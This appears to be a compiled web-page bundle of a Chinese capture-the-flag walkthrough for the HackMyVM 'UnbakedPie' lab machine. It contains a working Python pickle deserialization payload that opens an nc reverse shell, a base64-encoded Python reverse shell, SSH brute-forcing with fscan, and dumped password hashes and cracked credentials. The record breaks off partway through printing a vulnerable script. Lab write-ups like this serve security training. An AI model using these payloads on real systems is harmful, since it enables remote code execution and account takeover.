"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[748],{22386:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>s,metadata:()=>a,toc:()=>o});var i=t(85893),r=t(11151);const s={},l="UnbakedPie",a={id:"HackMyVM/Machines/UnbakedPie/index",title:"UnbakedPie",description:"[Linux VM] [Tested on VirtualBox] created by || ch4rm",source:"@site/docs/HackMyVM/Machines/UnbakedPie/index.md",sourceDirName:"HackMyVM/Machines/UnbakedPie",slug:"/HackMyVM/Machines/UnbakedPie/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/UnbakedPie/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/UnbakedPie/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Twisted",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Twisted/"},next:{title:"VivifyTech",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/VivifyTech/"}},c={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"\u4e0e\u641c\u7d22\u529f\u80fd\u8fdb\u884c\u4ea4\u4e92",id:"\u4e0e\u641c\u7d22\u529f\u80fd\u8fdb\u884c\u4ea4\u4e92",level:3},{value:"\u751f\u6210\u53cd\u5e8f\u5217\u5316\u6076\u610f\u8f7d\u8377",id:"\u751f\u6210\u53cd\u5e8f\u5217\u5316\u6076\u610f\u8f7d\u8377",level:3},{value:"User - Docker - root",id:"user---docker---root",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"\u6570\u636e\u5e93\u6587\u4ef6\u8bfb\u53d6",id:"\u6570\u636e\u5e93\u6587\u4ef6\u8bfb\u53d6",level:3},{value:"\u547d\u4ee4\u884c\u5386\u53f2",id:"\u547d\u4ee4\u884c\u5386\u53f2",level:3},{value:"\u5bc6\u7801\u7206\u7834",id:"\u5bc6\u7801\u7206\u7834",level:3},{value:"SSH \u7206\u7834",id:"ssh-\u7206\u7834",level:3},{value:"User - ramsey",id:"user---ramsey",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801",id:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801",level:3},{value:"User - oliver",id:"user---oliver",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-2",level:3},{value:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801",id:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801-1",level:3},{value:"\u5c1d\u8bd5\u5229\u7528",id:"\u5c1d\u8bd5\u5229\u7528",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,r.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"unbakedpie",children:"UnbakedPie"}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || ch4rm"}),(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-06"}),(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 92707e4a6a76dbd738ef2dbe716fcf7c"}),(0,i.jsx)(n.p,{children:"\u2620 Root // 31"}),(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 31"}),(0,i.jsx)(n.p,{children:"\ud83d\udcddNotes //\nRequires pivotting and owasp skills. Real life scenarios + a few ctf privesc. Made by ch4rm (@aniqfakhrul) & h0j3n (@h0j3n)."})]}),"\n",(0,i.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.119\n"})}),"\n",(0,i.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.119\nHost is up (0.00051s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT     STATE SERVICE    VERSION\n5003/tcp open  filemaker?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Date: Fri, 23 Feb 2024 07:34:15 GMT\n|     Server: WSGIServer/0.2 CPython/3.8.6\n|     Content-Type: text/html; charset=utf-8\n|     X-Frame-Options: DENY\n|     Vary: Cookie\n|     Content-Length: 7453\n|     X-Content-Type-Options: nosniff\n|     Referrer-Policy: same-origin\n|     Set-Cookie: csrftoken=wTXfC78Rn0Mg5kXVjEgMPcru1ulwDoVy9t17wj5RmELJZElX5xkCYhkdB4HvTGmw; expires=Fri, 21 Feb 2025 07:34:15 GMT; Max-Age=31449600; Path=/; SameSite=Lax\n|     <!DOCTYPE html>\n|     <html lang="en">\n|     <head>\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n|     <meta name="description" content="">\n|     <meta name="author" content="">\n|     <title>[Un]baked | /</title>\n|     \x3c!-- Bootstrap core CSS --\x3e\n|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">\n|     \x3c!-- Custom fonts for this template --\x3e\n|     <link href="/static/vendor/fontawesome-free/css/all.min.cs\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Date: Fri, 23 Feb 2024 07:34:16 GMT\n|     Server: WSGIServer/0.2 CPython/3.8.6\n|     Content-Type: text/html; charset=utf-8\n|     X-Frame-Options: DENY\n|     Vary: Cookie\n|     Content-Length: 7453\n|     X-Content-Type-Options: nosniff\n|     Referrer-Policy: same-origin\n|     Set-Cookie: csrftoken=r9a0Ot8xvhGgew8qiA5FC2X1Cgl2eiHHtB3YQizhqbxB1owpT998WDNvFlyn5HCf; expires=Fri, 21 Feb 2025 07:34:16 GMT; Max-Age=31449600; Path=/; SameSite=Lax\n|     <!DOCTYPE html>\n|     <html lang="en">\n|     <head>\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n|     <meta name="description" content="">\n|     <meta name="author" content="">\n|     <title>[Un]baked | /</title>\n|     \x3c!-- Bootstrap core CSS --\x3e\n|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">\n|     \x3c!-- Custom fonts for this template --\x3e\n|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs\n'})}),"\n",(0,i.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(99403).Z+"",width:"2560",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"[23:12:47] 200 -    5KB - /about\n[23:12:50] 301 -    0B  - /accounts/login  ->  /accounts/login/\n[23:12:58] 302 -    0B  - /admin/?/login  ->  /admin/login/?next=/admin/%3F/login\n[23:12:58] 302 -    0B  - /admin/  ->  /admin/login/?next=/admin/\n[23:12:59] 301 -    0B  - /admin/login  ->  /admin/login/\n......\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u672a\u5f97\u5230\u6709\u6548\u4fe1\u606f"}),"\n",(0,i.jsx)(n.h3,{id:"\u4e0e\u641c\u7d22\u529f\u80fd\u8fdb\u884c\u4ea4\u4e92",children:"\u4e0e\u641c\u7d22\u529f\u80fd\u8fdb\u884c\u4ea4\u4e92"}),"\n",(0,i.jsxs)(n.p,{children:["\u5728\u5c1d\u8bd5\u4f7f\u7528\u641c\u7d22\u529f\u80fd\u65f6\uff0c\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"test"})," \u4f5c\u4e3a\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53d1\u73b0\u672c\u5730 Cookie \u50a8\u5b58\u4e2d\u51fa\u73b0"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:'"gASVCAAAAAAAAACMBHRlc3SULg=="\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5e76\u53d1\u73b0\u4ee5\u4e0b\u8fd4\u56de\u6570\u636e\u5305"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:'HTTP/1.1 200 OK\nDate: Fri, 23 Feb 2024 13:00:51 GMT\nServer: WSGIServer/0.2 CPython/3.8.6\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: DENY\nVary: Cookie\nContent-Length: 4881\nX-Content-Type-Options: nosniff\nReferrer-Policy: same-origin\nSet-Cookie:  search_cookie="gASVCAAAAAAAAACMBHRlc3SULg=="; Path=/\nSet-Cookie:  csrftoken=jywYAtaiwPVi0GDpUy243peCMIR3LVPtW5OTnzKTrPxgMWN02CyGeW5NKWKNOiUE; expires=Fri, 21 Feb 2025 13:00:51 GMT; Max-Age=31449600; Path=/; SameSite=Lax\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u4ea7\u751f\u8fdb\u884c\u89e3\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import base64\nimport pickle\n\ns = "gASVCAAAAAAAAACMBHRlc3SULg=="\n\ns = pickle.loads(base64.b64decode(s))\n\nprint(s)\n# test\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u786e\u5b9a\u8fdc\u7a0b\u670d\u52a1\u5b58\u5728 Python Pickle \u5e8f\u5217\u5316\u76f8\u5173\u64cd\u4f5c\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsx)(n.h3,{id:"\u751f\u6210\u53cd\u5e8f\u5217\u5316\u6076\u610f\u8f7d\u8377",children:"\u751f\u6210\u53cd\u5e8f\u5217\u5316\u6076\u610f\u8f7d\u8377"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import pickle, os, base64\nclass P(object):\n    def __reduce__(self):\n        return (os.system,("nc 192.168.56.102 9999 -e /bin/bash",))\nprint(base64.b64encode(pickle.dumps(P())))\n# gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCRuYyAxOTIuMTY4LjU2LjEwMiA5OTk5IC1lIC9iaW4vYmFzaCCUhZRSlC4=\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u8fd9\u4e2a\u751f\u6210\u7684\u6076\u610f\u8f7d\u8377\u6295\u5165\u6d4f\u89c8\u4f1a\u8bdd\u4e2d\uff0c\u8fdb\u884c\u4ea4\u4e92"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:'POST /search HTTP/1.1\nHost: 192.168.56.119:5003\nContent-Length: 98\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.56.119:5003\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.56.119:5003/search\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: csrftoken=dSQDeQ2PWUIMTRw1KjUQeaTIxe2ntAkmPqDcY27I3yYvnHunYadk9MPbt3tmqKSl; search_cookie="gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCRuYyAxOTIuMTY4LjU2LjEwMiA5OTk5IC1lIC9iaW4vYmFzaCCUhZRSlC4="\nConnection: close\n\ncsrfmiddlewaretoken=8sIxi3DjITlwk9AQtXq37xpboAzzCPdeK0v62fIcPxBfOZycHOJx29lEkp0yzZLd&query=asasasa\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,i.jsx)(n.h2,{id:"user---docker---root",children:"User - Docker - root"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 9999\n[17:34:56] Welcome to pwncat \ud83d\udc08!\n[17:37:23] received connection from 192.168.56.119:59728\n[17:37:24] 192.168.56.119:59728: registered new host w/ db\n(local) pwncat$ back\n(remote) root@8b39a559b296:/home# whoami\nroot\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"PEASS-ng"})," \u6216\u8005 ",(0,i.jsx)(n.code,{children:"CDK"})," \u5747\u80fd\u68c0\u6d4b\u5230\u6211\u4eec\u6b63\u5904\u4e8e Docker \u5bb9\u5668\u5185"]}),"\n",(0,i.jsx)(n.h3,{id:"\u6570\u636e\u5e93\u6587\u4ef6\u8bfb\u53d6",children:"\u6570\u636e\u5e93\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,i.jsxs)(n.p,{children:["\u5728\u7ad9\u70b9\u76ee\u5f55\u4e2d\uff0c\u53d1\u73b0\u4e00\u4e2a\u6570\u636e\u5e93\u6587\u4ef6 ",(0,i.jsx)(n.code,{children:"/home/site/db.sqlite3"})]}),"\n",(0,i.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u8bfb\u53d6"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"id"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"password"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"last_login"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"is_superuser"}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:"username"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"1"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo="}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:'"2020-10-03 10:43:47.229292"'}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"1"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"aniqfakhrul"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"11"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg="}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:'"2020-10-02 10:16:45.805533"'}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"0"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"testing"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"12"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik="}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:'"2020-10-03 10:44:10.758867"'}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"0"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"ramsey"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"13"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE="}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:'"2020-10-02 14:42:59.192571"'}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"0"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"oliver"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"14"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY="}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:'"2020-10-02 14:43:15.187554"'}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"0"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"wan"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"\u547d\u4ee4\u884c\u5386\u53f2",children:"\u547d\u4ee4\u884c\u5386\u53f2"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="/root/.bash_history"',children:"ssh ramsey@172.17.0.1\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4ece\u4e2d\u5f97\u5230\u4e00\u4e2a\u7528\u6237\u540d ",(0,i.jsx)(n.code,{children:"ramsey"})]}),"\n",(0,i.jsx)(n.h3,{id:"\u5bc6\u7801\u7206\u7834",children:"\u5bc6\u7801\u7206\u7834"}),"\n",(0,i.jsx)(n.p,{children:"\u6839\u636e\u6570\u636e\u5e93\u4e2d\u5f97\u5230\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5f97\u77e5\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"Username: ramsey\nPassword: pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u5bf9\u5bc6\u7801\u53d1\u8d77\u7206\u7834\uff0c\u4f46\u662f\u672a\u627e\u5230\u7ed3\u679c"}),"\n",(0,i.jsx)(n.h3,{id:"ssh-\u7206\u7834",children:"SSH \u7206\u7834"}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u5bf9 SSH \u670d\u52a1\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u76f4\u63a5\u5728 Docker \u5bb9\u5668\u5185\u90e8\u7f72 ",(0,i.jsx)(n.a,{href:"https://github.com/shadow1ng/fscan",children:"shadow1ng/fscan: \u4e00\u6b3e\u5185\u7f51\u7efc\u5408\u626b\u63cf\u5de5\u5177\uff0c\u65b9\u4fbf\u4e00\u952e\u81ea\u52a8\u5316\u3001\u5168\u65b9\u4f4d\u6f0f\u626b\u626b\u63cf\u3002"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(local) pwncat$ upload ./tools/fscan\n./fscan \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 100.0% \u2022 6.3/6.3 MB \u2022 1.7 MB/s \u2022 0:00:00\n[20:59:58] uploaded 6.27MiB in 4.03 seconds\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540e\u6307\u5b9a\u7528\u6237\u540d\u4e3a ",(0,i.jsx)(n.code,{children:"ramsey"}),"\uff0c\u5f00\u59cb\u626b\u63cf"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.3\nstart infoscan\n172.17.0.1:22 open\n[*] alive ports len is: 1\nstart vulscan\n[+] SSH 172.17.0.1:22:ramsey 12345678\n\u5df2\u5b8c\u6210 1/1\n[*] \u626b\u63cf\u7ed3\u675f, \u8017\u65f6: 58.712306679s\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230\u51ed\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"ramsey:12345678\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user---ramsey",children:"User - ramsey"}),"\n",(0,i.jsx)(n.p,{children:"\u7531\u4e8e\u9776\u673a\u4e0a\u5e76\u672a\u90e8\u7f72 SSH \u5ba2\u6237\u7aef\uff0c\u6240\u4ee5\u91c7\u7528 fscan \u5185\u7f6e\u7684\u547d\u4ee4\u6267\u884c\u529f\u80fd"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'(remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey -pwd "12345678" -c "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTAyIiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn | base64 -d | bash"\n\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 8888\n[21:06:55] Welcome to pwncat \ud83d\udc08!\n[21:09:25] received connection from 192.168.56.119:54850\n[21:09:26] 192.168.56.119:54850: registered new host w/ db\n(local) pwncat$ back\n(remote) ramsey@unbaked:/home/ramsey$ whoami\nramsey\n'})}),"\n",(0,i.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"Unb4ked_W00tw00t\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) ramsey@unbaked:/home/ramsey$ sudo -l\n[sudo] password for ramsey:\nMatching Defaults entries for ramsey on unbaked:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser ramsey may run the following commands on unbaked:\n    (oliver) /usr/bin/python /home/ramsey/vuln.py\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801",children:"\u8bfb\u53d6\u670d\u52a1\u6e90\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",metastring:'title="/home/ramsey/vuln.py"',children:'#!/usr/bin/python\n# coding=utf-8\n\ntry:\n    from PIL import Image\nexcept ImportError:\n    import Image\nimport pytesseract\nimport sys\nimport os\nimport time\n\n\n#Header\ndef header():\n        banner = \'\'\'\\033[33m\n                                      (\n                                       )\n                                  __..---..__\n                              ,-=\'  /  |  \\  `=-.\n                             :--..___________..--;\n                              \\.,_____________,./\n\n\n\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551   \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\n\u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d   \u255a\u2550\u255d   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\\033[m\'\'\'\n        return banner\n\n#Function Instructions\ndef instructions():\n        print "\\n\\t\\t\\t",9 * "-" , "WELCOME!" , 9 * "-"\n        print "\\t\\t\\t","1. 